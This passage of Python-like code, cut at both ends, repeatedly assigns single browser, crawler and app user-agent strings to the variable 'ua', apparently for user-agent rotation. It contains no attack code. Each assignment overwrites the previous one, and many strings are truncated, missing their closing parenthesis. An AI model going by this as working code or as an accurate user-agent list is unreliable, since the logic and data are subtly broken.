    'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER']
ua = [
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729']
ua = [
    'Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36']
ua = [
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36']
ua = [
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022']
ua = [
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko']
ua = [
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0']
ua = [
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
ua = [
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36']
ua = [
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0']
ua = [
    'Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy']
ua = [
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html']
ua = [
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm']
ua = [
    'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html']
ua = [
    'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+']
ua = [
    'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html']
ua = [
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php']
ua = [
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0']
ua = [
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0']
ua = [
    'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0']
ua = [
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0']
ua = [
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36']
ua = [
    'Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3']
ua = [
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22']
ua = [
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0']
ua = [
    '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi']
ua = [
    'HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0']
ua = [
    'HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320']
ua = [
    'com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960']
ua = [
    'Mogujie4Android/NAMhuawei/1290']
ua = [
    'Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0']
ua = [
    'Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0']
ua = [
    'Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1']
ua = [
    'Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1']
ua = [
    'Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15']
ua = [
    'Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101']
ua = [
    'NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0']
ua = [
    'Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0']
ua = [
    'Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/']
ua = [
    'Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0']
ua = [
    'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254']
ua = [
    'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536']
ua = [
    'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246']
ua = [
    'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3']
ua = [
    'Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60']
ua = [
